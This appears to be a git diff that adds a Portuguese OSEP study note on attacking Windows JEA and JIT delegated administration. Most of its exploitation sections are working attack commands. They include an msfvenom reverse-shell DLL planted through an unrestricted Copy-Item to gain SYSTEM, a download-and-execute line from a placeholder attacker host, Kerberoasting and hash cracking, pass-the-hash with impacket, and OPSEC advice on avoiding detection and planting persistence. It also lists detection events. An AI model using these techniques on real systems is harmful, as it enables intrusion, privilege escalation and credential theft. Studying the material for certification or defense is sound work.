@@ -1,0 +1,673 @@
+---
+title: "JEA & JIT Exploitation"
+---
+
+# JEA e JIT — Exploração de Administração Delegada
+
+## Organizações Maduras Não Têm DA Permanente
+
+JEA (Just Enough Administration) e JIT (Just-In-Time Access) são controles que organizações implementam pra reduzir contas com privilégio permanente. Ambos seguem least privilege, mas quando mal configurados ou comprometidos introduzem novos vetores: JEA mal configurado expõe comandos administrativos sem validação de parâmetros, permitindo escalonamento a partir de conta restrita; JIT comprometido (controle da conta aprovadora ou abuso de aprovação automática) concede acesso temporário a grupos de alto privilégio.
+
+Pra OSEP é exigência prática — organizações maduras já não têm Domain Admin ativo permanentemente. O próximo passo da cadeia de ataque passa por entender como esses controles funcionam e onde falham.
+
+---
+
+## JEA — Just Enough Administration
+
+### Teoria
+
+JEA foi introduzido pela Microsoft no Windows Server 2016. Permite administração delegada via
+**PowerShell Remoting (WinRM)**, limitando exatamente quais comandos um usuário pode executar
+em uma máquina específica, mesmo sem ter privilégios de administrador local completos.
+
+#### Como Funciona — Os Três Elementos
+
+**1. Session Configuration File (`.pssc`)**
+
+Criado com `New-PSSessionConfigurationFile`. Define como a sessão PowerShell se comporta.
+
+```powershell
+# Criar arquivo de configuração padrão
+New-PSSessionConfigurationFile -Path C:\JEA\SessionConfig.pssc
+```
+
+Campos críticos do `.pssc`:
+
+```powershell
+@{
+    SchemaVersion = '2.0.0.0'
+    GUID = 'e4f7e55c-57dc-41b2-bab0-ae4bb209fbe9'
+    Author = 'administrator'
+
+    # CRÍTICO: Define o modo de linguagem da sessão
+    # 'RestrictedRemoteServer' -> NoLanguageMode (recomendado/seguro)
+    # 'Default'               -> FullLanguageMode (PERIGOSO — equivale a admin completo)
+    # 'Empty'                 -> sem comandos disponíveis por padrão
+    SessionType = 'RestrictedRemoteServer'
+
+    # Onde guardar transcrições das sessões (auditoria)
+    TranscriptDirectory = 'C:\Transcripts\'
+
+    # Conta virtual — temporária, destruída ao fim da sessão
+    # Por padrão pertence ao grupo Administrators local
+    RunAsVirtualAccount = $true
+
+    # Define quais grupos AD têm acesso a esta configuração JEA
+    RoleDefinitions = @{
+        'CORP\HelpDesk' = @{ RoleCapabilities = 'HelpDeskSupport' }
+        'CORP\DBAdmins'  = @{ RoleCapabilityFiles = 'C:\JEA\DBAdmin.psrc' }
+    }
+}
+```
+
+**Implicação de `SessionType = 'Default'`:**
+Se configurado como `Default`, a sessão opera em `FullLanguageMode`. O usuário conectado via
+JEA terá acesso a toda a linguagem PowerShell com contexto administrativo (virtual account).
+Isso é **equivalente a ter admin completo**.
+
+**2. Role Capabilities File (`.psrc`)**
+
+Criado com `New-PSRoleCapabilityFile`. Define exatamente quais comandos estão disponíveis.
+
+```powershell
+# Campos relevantes em um .psrc
+...
+# Cmdlets visíveis — com ou sem validação de parâmetros
+VisibleCmdlets = 'Get-Process',
+                 @{ Name = 'Restart-Service';
+                    Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler', 'W32Time' } },
+                 'Copy-Item'   # <- SEM validação = PERIGOSO
+
+# Provedores visíveis (filesystem, registry, etc.)
+# VisibleProviders = 'FileSystem'  # <- acesso completo ao sistema de arquivos
+
+# Funções externas permitidas
+# VisibleExternalCommands = 'C:\scripts\approved.ps1'
+...
+```
+
+**Comandos perigosos que NUNCA devem aparecer em `.psrc` sem validação rígida:**
+- `Copy-Item` — sem restrição de origem/destino = acesso ao sistema de arquivos completo
+- `Start-Process` — execução arbitrária de processos
+- `Invoke-Expression` — execução de código arbitrário
+- `Invoke-Command` — execução remota de código
+
+**3. Registro da Configuração**
+
+```powershell
+# Registrar o endpoint JEA (reinicia o WinRM)
+Register-PSSessionConfiguration -Name 'JEA_HelpDesk' `
+                                 -Path 'C:\JEA\SessionConfig.pssc' `
+                                 -Force
+
+# Verificar endpoints registrados
+Get-PSSessionConfiguration
+```
+
+#### Virtual Accounts
+
+- São contas temporárias criadas no momento da conexão JEA
+- O usuário conectado **não precisa conhecer a senha** da virtual account
+- Pertencem ao grupo **Administrators** local por padrão
+- São **destruídas** ao encerrar a sessão
+- Permitem que usuários com baixo privilégio executem tarefas com contexto administrativo,
+  mas apenas os comandos definidos no `.psrc`
+
+---
+
+### Enumeração
+
+JEA não deixa rastros óbvios no Active Directory — é aplicado via PowerShell, não via atributos
+LDAP. A enumeração requer puzzling de múltiplas fontes.
+
+#### 1. Identificar Máquinas com WinRM/PS-Remoting
+
+```bash
+# Nmap — porta padrão do WinRM
+nmap -p 5985,5986 192.168.50.0/24 --open -oG winrm_hosts.txt
+```
+
+```powershell
+# PowerShell — testar conectividade WinRM
+Test-WSMan -ComputerName files02
+Test-WSMan -ComputerName files02 -Authentication Negotiate
+```
+
+#### 2. Verificar Histórico PowerShell de Usuários Comprometidos
+
+O histórico do PowerShell é o principal indicador de uso de JEA — contém o comando
+`Enter-PSSession` com o flag `-ConfigurationName`.
+
+```powershell
+# Localizar o arquivo de histórico
+(Get-PSReadlineOption).HistorySavePath
+# Resultado típico:
+# C:\Users\mary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Ler o histórico
+type C:\Users\mary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+**Exemplo de saída reveladora (do lab OSEP):**
+```
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+copy-item -path C:\shares\engineering_old\scripts\start.ps1.bak -destination C:\shares\home\mary
+exit
+```
+
+O flag `-ConfigurationName j_fs02` é o indicador de JEA. O nome da configuração (`j_fs02`)
+sugere que:
+- `j_` = prefixo de JEA (convenção de nomenclatura)
+- `fs02` = máquina alvo (FILES02)
+
+#### 3. Enumerar Grupos com Convenção de Nomenclatura JEA
+
+```powershell
+# Usando PowerView — procurar grupos com prefixos j_, jea_, etc.
+Get-NetGroup | Where-Object { $_.name -like "j_*" }
+Get-NetGroup | Where-Object { $_.name -like "jea_*" }
+
+# Verificar membros de grupos JEA
+Get-NetGroup j_fs02 | select member
+Get-NetGroupMember j_fs02
+```
+
+#### 4. Conectar e Enumerar Comandos Disponíveis
+
+```powershell
+# Conectar ao endpoint JEA (usar -ConfigurationName)
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+
+# Dentro da sessão JEA — verificar quais comandos estão disponíveis
+[files02]: PS> Get-Command
+```
+
+**Saída típica de sessão JEA bem configurada (RestrictedRemoteServer):**
+```
+CommandType     Name                    Version    Source
+-----------     ----                    -------    ------
+Function        Clear-Host
+Function        Exit-PSSession
+Function        Get-Command
+Function        Get-FormatData
+Function        Get-Help
+Function        Measure-Object
+Function        Out-Default
+Function        Select-Object
+Cmdlet          Copy-Item              3.0.0.0    Microsoft.PowerShell.Management
+```
+
+Os primeiros 8 comandos são **padrão** do RestrictedRemoteServer. O `Copy-Item` foi
+**adicionado pelo administrador** — e sem validação, é explorável.
+
+#### 5. Confirmar NoLanguageMode
+
+```powershell
+# Dentro da sessão JEA — tentar comandos normais
+[files02]: PS> whoami
+# Erro: 'whoami.exe' is not recognized...
+
+[files02]: PS> [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+# Erro: The syntax is not supported by this runspace. This can occur if the
+#        runspace is in no-language mode.
+```
+
+`NoLanguageMode` confirma que é uma sessão JEA com `RestrictedRemoteServer`.
+
+---
+
+### Exploração e Breakout
+
+#### Vetor 1 — Copy-Item sem Validação (FileSystem Abuse)
+
+**Condição:** `Copy-Item` disponível sem restrição de `-Path` ou `-Destination`.
+
+**Impacto:** Acesso de leitura/escrita a todo o sistema de arquivos com privilégios administrativos
+(via virtual account que é membro de Administrators).
+
+**Teste de acesso de leitura:**
+```powershell
+# Tentar copiar um arquivo que só admin lê
+[files02]: PS> Copy-Item -Path 'C:\Windows\System32\drivers\etc\hosts' `
+                         -Destination 'C:\shares\home\mary'
+# Sem erro = acesso confirmado como admin
+```
+
+**Verificar arquivo copiado (de outra sessão/máquina):**
+```powershell
+type \\files02\home$\mary\hosts
+```
+
+**Técnica de Escrita — DLL Hijacking via Copy-Item:**
+
+O acesso de escrita com privilégios de admin em `C:\Program Files\` permite DLL hijacking.
+
+```bash
+# 1. Kali: Gerar DLL maliciosa com msfvenom
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+         LHOST=192.168.48.4 LPORT=443 \
+         -a x64 --platform windows \
+         -f dll > msasn1.dll
+```
+
+```powershell
+# 2. Copiar DLL para pasta acessível à vítima (home folder)
+# (usando sessão legítima como mary em CLIENT02)
+# Assumindo que a DLL já está em C:\shares\home\mary\
+
+# 3. Conectar ao JEA e copiar DLL para o diretório do serviço vulnerável
+Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+
+[files02]: PS> copy-item C:\shares\home\mary\msasn1.dll `
+               -destination "C:\Program Files\FileZilla Server\msasn1.dll"
+```
+
+```bash
+# 4. Kali: Aguardar reinicialização do serviço/máquina
+msf6 > use exploit/multi/handler
+msf6 > set payload windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.48.4
+msf6 > set LPORT 443
+msf6 > run
+
+# Resultado após reinício do serviço FileZilla:
+# [*] Meterpreter session 1 opened
+# meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+```
+
+**Como identificar qual DLL usar (Process Monitor):**
+1. Instalar FileZilla-Server em máquina de teste (CLIENT01)
+2. Configurar Process Monitor com filtros:
+   - Process Name = `filezilla-server.exe`
+   - Result = `NAME NOT FOUND`
+3. Iniciar o serviço e observar DLLs faltantes no diretório da aplicação
+4. Testar qual DLL pode ser substituída sem crashar o serviço (trial and error)
+5. `msasn1.dll` foi identificada como funcional no lab OSEP
+
+**DLL Proxying (alternativa para não crashar o serviço):**
+A DLL maliciosa encaminha todas as chamadas legítimas para a DLL original, evitando interrupção
+do serviço. Mais estável, mas mais complexo de implementar.
+
+#### Vetor 2 — Start-Process sem Validação de Parâmetros
+
+Se `Start-Process` estiver disponível sem `ValidateSet` ou `ValidatePattern`:
+
+```powershell
+[alvo]: PS> Start-Process -FilePath "cmd.exe" -ArgumentList "/c powershell -c IEX(...)"
+[alvo]: PS> Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "..."
+```
+
+A shell resultante herda o contexto da virtual account (Administrators).
+
+#### Vetor 3 — FileSystem Provider Exposto
+
+Se `VisibleProviders = 'FileSystem'` estiver configurado no `.psrc`:
+
+```powershell
+# Navegar pelo sistema de arquivos sem restrição de comandos de listagem
+[alvo]: PS> Get-Item C:\Windows\System32\drivers\etc\hosts
+[alvo]: PS> Get-Content C:\Windows\System32\drivers\etc\shadow  # Linux equiv.
+[alvo]: PS> Set-Content C:\Windows\System32\...  # Escrita se permitido
+```
+
+#### Vetor 4 — SessionType Default (FullLanguageMode)
+
+Se `SessionType = 'Default'`, a sessão opera em `FullLanguageMode`:
+
+```powershell
+# Verificar modo de linguagem
+[alvo]: PS> $ExecutionContext.SessionState.LanguageMode
+# FullLanguage = sem restrições de linguagem
+
+# Com FullLanguage — pode criar funções, chamar APIs .NET, etc.
+[alvo]: PS> $client = New-Object System.Net.WebClient
+[alvo]: PS> $client.DownloadString('http://atacante/payload.ps1') | IEX
+```
+
+---
+
+## JIT — Just-In-Time Access
+
+### Teoria
+
+JIT Administration é um controle de segurança que fornece **acesso temporário** a recursos com
+base em necessidade específica. Após o período definido, o acesso é revogado automaticamente.
+
+**Objetivo:** Eliminar contas com privilégios permanentes. Um usuário recebe acesso de admin
+por 1 hora para executar manutenção, depois o acesso é automaticamente removido.
+
+#### Privileged Access Management (PAM) no Active Directory
+
+Para JIT baseado em tempo funcionar com AD, a feature **Privileged Access Management (PAM)**
+deve estar habilitada. Isso escreve atributos específicos no AD que podemos enumerar.
+
+**Características do PAM no AD:**
+- Uma vez habilitado, **não pode ser desabilitado**
+- Suporta membros de grupo com **tempo de expiração** (`msDS-MemberTransitiveMemberOf`)
+- Requer `Windows2016Forest` ou superior
+
+**Implementações comuns de JIT:**
+- **Microsoft Identity Manager (MIM)** — solução nativa Microsoft, complexa
+- **CyberArk** — PAM enterprise com vault de senhas e JIT
+- **BeyondTrust** — similar ao CyberArk, muito usado em ambientes enterprise
+- **Soluções customizadas** — web apps internas (como a do lab OSEP)
+
+**Nomenclatura comum de grupos JIT:**
+- `j_request` — grupo que permite solicitar acesso via portal JIT
+- `j_approve` — grupo que pode aprovar solicitações
+- `la_web` (local admin web) — grupo que concede admin local em WEB01
+- `la_clients` — grupo que concede admin local em estações de trabalho
+- `sql_admins` — grupo com acesso ao SQL
+
+---
+
+### Enumeração
+
+#### 1. Verificar se PAM está Habilitado no Domínio
+
+```powershell
+# Importar o módulo AD (não requer privilégios de admin)
+Import-Module C:\Tools\Microsoft.ActiveDirectory.Management.dll
+
+# Verificar features opcionais do domínio
+Get-ADOptionalFeature -Filter *
+```
+
+**Saída indicando JIT ativo:**
+```
+FeatureGUID       : ec43e873-cce8-4640-b4ab-07ffe4ab5bcd
+RequiredForestMode: Windows2016Forest
+IsDisableable     : False
+DistinguishedName : CN=Privileged Access Management Feature,
+                    CN=Optional Features,CN=Directory Service,
+                    CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=com
+Name              : Privileged Access Management Feature
+```
+
+**Nota:** PAM habilitado **não garante** que JIT está em uso — PAM suporta outras features.
+É necessário continuar enumerando.
+
+#### 2. Enumerar Grupos com Nomenclatura JIT
+
+```powershell
+# Usando PowerView
+Get-NetGroup | Where-Object { $_.name -like "j_*" }
+Get-NetGroup | Where-Object { $_.name -like "la_*" }
+
+# Verificar membros do grupo aprovador
+Get-NetGroup j_approve | select member
+```
+
+**Saída reveladora:**
+```powershell
+# mary pertence a j_request (pode solicitar acesso)
+Get-NetUser mary | select memberof
+# memberof: {j_request, j_fs02, Engineering}
+
+# james pertence a j_approve (pode aprovar solicitações)
+Get-NetGroup j_approve | select member
+# member: CN=James,OU=Engineering,OU=CorpUsers,DC=corp,DC=com
+```
+
+#### 3. Enumerar GPOs Vinculados aos Grupos JIT
+
+```powershell
+# Listar todas as GPOs do domínio
+Get-NetGPO | select displayname
+
+# Inspecionar GPO específica
+Get-NetGPO l_web01
+```
+
+**Saída da GPO l_web01:**
+```
+gpcfilesyspath: \\corp.com\SysVol\corp.com\Policies\{99EC2AB4-...}
+```
+
+```powershell
+# Ler o Groups.xml da GPO (qualquer usuário de domínio tem acesso ao SYSVOL)
+type "\\corp.com\SysVol\corp.com\Policies\{99EC2AB4-...}\Machine\Preferences\Groups\Groups.xml"
+```
+
+**Conteúdo revelador do Groups.xml:**
+```xml
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <Group name="Administrators (built-in)" ...>
+    <Properties groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
+      <Members>
+        <!-- la_web adicionado ao grupo Administrators local de WEB01 -->
+        <Member name="CORP\la_web" action="ADD" sid="S-1-5-21-...-7604"/>
+      </Members>
+    </Properties>
+    <Filters>
+      <!-- Esta GPO aplica apenas em WEB01 -->
+      <FilterComputer type="NETBIOS" name="WEB01"/>
+    </Filters>
+  </Group>
+</Groups>
+```
+
+**Interpretação:** Se `mary` for adicionada ao grupo `la_web` (via JIT), ela se tornará
+admin local em WEB01 por força da GPO `l_web01`.
+
+#### 4. Verificar Histórico do Browser e Aplicações JIT
+
+```powershell
+# Verificar histórico de navegação (se comprometeu a máquina)
+# Chrome
+type "C:\Users\mary\AppData\Local\Google\Chrome\User Data\Default\History"
+
+# Edge
+type "C:\Users\mary\AppData\Local\Microsoft\Edge\User Data\Default\History"
+```
+
+Aplicações JIT customizadas frequentemente ficam em hosts internos como:
+- `http://mgmt01`
+- `http://jit.corp.com`
+- `http://pam.corp.com/request`
+
+#### 5. Verificar Membros Atuais de Grupos Privilegiados
+
+```powershell
+# Confirmar que mary ainda NÃO é membro do grupo alvo
+whoami /groups | findstr /i "la_web\|sql_admins\|administrators"
+
+# Via PowerView
+Get-NetUser mary | select memberof
+```
+
+---
+
+### Exploração
+
+#### Cenário 1 — Aprovação Automática
+
+Alguns portais JIT aprovam solicitações automaticamente se o usuário já pertence ao grupo
+`j_request`. Nesse caso, basta solicitar acesso.
+
+```
+1. Acessar http://mgmt01
+2. Clicar em "Create New Request"
+3. Selecionar o grupo desejado (ex: Web01)
+4. Submeter — se aprovação automática, acesso concedido imediatamente
+```
+
+#### Cenário 2 — Comprometer a Conta Aprovadora
+
+Quando aprovação requer ação humana (conta `j_approve`), comprometer a conta aprovadora.
+
+```powershell
+# james pertence a j_approve
+# Comprometer james via: password spray, hash capturado, kerberoasting, etc.
+# Depois, logar como james e aprovar a solicitação em http://mgmt01
+
+# Verificar qual serviço james usa (kerberoastable?)
+Get-NetUser james | select serviceprincipalname
+
+# Tentar Kerberoasting se james tiver SPN
+Invoke-Kerberoast -Identity james -OutputFormat Hashcat
+hashcat -m 13100 james_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Passo a Passo — Exploração Completa (Lab OSEP)
+
+**Pré-condição:** Acesso como `mary` em CLIENT01, PAM habilitado, `j_approve` = james.
+
+```powershell
+# Passo 1 — Confirmar que mary não tem o acesso ainda
+whoami /groups
+# CORP\j_request ... [sem la_web]
+```
+
+```
+# Passo 2 — Solicitar acesso no portal JIT
+# Browser -> http://mgmt01 -> Create New Request -> Web01 -> Submit
+# Status: Pending (aguardando aprovação de james)
+```
+
+```powershell
+# Passo 3 — (como james em CLIENT02) Aprovar a solicitação
+# Browser -> http://mgmt01 -> Review Requests -> Approve (mary -> Web01)
+# Aguardar "Processed" (pode levar até 1 minuto no lab)
+```
+
+```powershell
+# Passo 4 — Atualizar ticket Kerberos (sem logout)
+# O ticket atual de mary NÃO inclui la_web ainda
+klist purge
+# Resultado: Ticket(s) purged!
+```
+
+```powershell
+# Passo 5 — Conectar ao WEB01 (novo ticket será emitido com la_web)
+Enter-PSSession -ComputerName WEB01
+# O KDC verifica a membros de grupo ao emitir o TGS
+# la_web agora está incluído -> acesso concedido pela GPO l_web01
+```
+
+```powershell
+# Passo 6 — Confirmar acesso como Administrators em WEB01
+[WEB01]: PS> whoami /groups | findstr /i "administrators"
+# BUILTIN\Administrators   Alias   ...   Mandatory group, Enabled by default, Enabled group, Group owner
+```
+
+**Por que `klist purge` funciona em vez de logout:**
+O ticket Kerberos já emitido não reflete a nova membros de grupo. Ao purgá-lo e iniciar
+uma nova conexão via WinRM (que usa Kerberos), o KDC emite um novo TGT e TGS que incluem
+`la_web` na PAC (Privilege Attribute Certificate).
+
+**Quando `klist purge` NÃO é suficiente:**
+- Acesso a grupos locais em **estações de trabalho** — requer logoff/logon interativo
+- Acesso via **NTLM** em vez de Kerberos — não beneficia da atualização de ticket
+- Se o grupo JIT usa **shadow principal** (não grupo AD padrão) — comportamento diferente
+
+#### Técnica Alternativa — Pass-the-Hash para Atualizar Contexto
+
+Se tiver a hash NTLM da conta (sem a senha):
+
+```bash
+# Usar pth-winexe ou impacket para autenticar com nova membros de grupo
+impacket-psexec CORP/mary@web01 -hashes :NTLM_HASH_AQUI
+
+# Ou via wmiexec
+impacket-wmiexec CORP/mary@web01 -hashes :NTLM_HASH_AQUI
+```
+
+#### Exploração de Acesso SQL via JIT
+
+```powershell
+# Se sql_admins concede acesso ao SQL01:
+# 1. Solicitar acesso ao grupo sql_admins via portal JIT
+# 2. Ter aprovado (ou comprometer james)
+# 3. Purgar tickets
+klist purge
+
+# 4. Conectar ao SQL com credenciais Kerberos
+Invoke-Sqlcmd -ServerInstance SQL01 -Query "SELECT @@version"
+# OU usar sqlcmd nativo:
+sqlcmd -S SQL01 -E -Q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"
+# IS_SRVROLEMEMBER = 1 confirma acesso de sysadmin
+```
+
+---
+
+## Detecção e OPSEC
+
+### Indicadores de Comprometimento de JEA
+
+| Evento | ID de Evento | Descrição |
+|--------|-------------|-----------|
+| Conexão JEA | 4688 / 4624 | Criação de processo wsmprovhost.exe com usuário de baixo privilégio |
+| Comandos executados | PowerShell Block Logging (4104) | Comandos executados na sessão JEA |
+| Acesso a arquivo | 4663 | Acesso a arquivos via Copy-Item não esperado |
+| Virtual Account | 4720 | Criação da conta virtual temporária |
+
+```powershell
+# Verificar logs de transcrição JEA (se TranscriptDirectory configurado)
+ls C:\Transcripts\
+# Cada sessão gera um arquivo com todos os comandos executados
+```
+
+### Indicadores de Comprometimento de JIT
+
+| Evento | Descrição |
+|--------|-----------|
+| Solicitação JIT não esperada | Usuário comum solicita acesso a grupo de alto privilégio |
+| Aprovação por conta comprometida | james aprova solicitação fora do horário normal |
+| `klist purge` + conexão imediata | Indica atualização proposital de ticket Kerberos |
+| Acesso a WEB01/SQL01 logo após adição ao grupo | Correlação temporal suspeita |
+
+### Como Reduzir Ruído Durante a Exploração
+
+```powershell
+# Verificar se há transcrições ativas antes de executar comandos sensíveis
+[files02]: PS> Get-PSSessionConfiguration -Name j_fs02 | Select-Object *
+
+# Evitar comandos que gerem eventos ruidosos
+# Preferir Copy-Item a Invoke-Expression para exfiltração de arquivos
+```
+
+### Considerações de OPSEC
+
+1. **JEA gera logs ricos** — se `TranscriptDirectory` estiver configurado, todos os comandos
+   são registrados. Assumir que estão sendo logados e usar apenas o necessário.
+
+2. **Timing do JIT** — solicitar acesso e usá-lo imediatamente pode correlacionar eventos.
+   Em ambientes monitorados, aguardar um tempo plausível.
+
+3. **Não exceder o timespan** — acesso JIT tem duração definida. Implantar persistência
+   (scheduled task, startup folder, DLL hijacking) durante a janela de acesso.
+
+4. **klist purge é detectável** — o evento de purga do cache Kerberos (4771 no DC) pode
+   ser correlacionado com a adição ao grupo e a conexão subsequente.
+
+5. **Não abusar do Copy-Item repetidamente** — cada acesso gera eventos 4663. Copiar
+   apenas o necessário.
+
+---
+
+## Módulos Relacionados
+
+| Tema | Módulo |
+|------|--------|
+| WinRM e lateral movement | `08_movimentacao_lateral/01_lateral_movement_windows.md` |
+| DLL Hijacking (técnica geral) | `04_evasao/07_load_time_evasion.md` |
+| Kerberoasting | `09_active_directory/02_kerberoasting_e_asrep.md` |
+| Pass-the-Hash | `08_movimentacao_lateral/01_lateral_movement_windows.md` |
+| Enumeração AD (BloodHound, PowerView) | `09_active_directory/08_bloodhound_e_enumeracao.md` |
+| Kerberos Delegation | `09_active_directory/05_delegacao_unconstrained.md` |
+
+---
+
+## Resumo Comparativo: JEA vs JIT
+
+| Aspecto | JEA | JIT |
+|---------|-----|-----|
+| **Tecnologia base** | PowerShell / WinRM | Active Directory PAM Feature |
+| **Rastros em AD** | Nenhum (configurado via .pssc/.psrc) | Get-ADOptionalFeature detecta PAM |
+| **Vetor de enumeração** | Histórico PS, nomes de grupos, scan WinRM | Grupos j_request/j_approve, GPOs, browser history |
+| **Vetor de exploração** | Cmdlets sem validação (Copy-Item, Start-Process) | Comprometer aprovador ou explorar aprovação automática |
+| **Privilégio resultante** | SYSTEM/NT AUTHORITY via virtual account | Admin local em máquinas específicas via grupo AD |
+| **Persistência** | DLL hijacking, startup folder | Deve ser estabelecida durante a janela de acesso |
+| **Complexidade de detecção** | Logs de transcrição, Event ID 4104 | Eventos de modificação de grupo, correlação temporal |
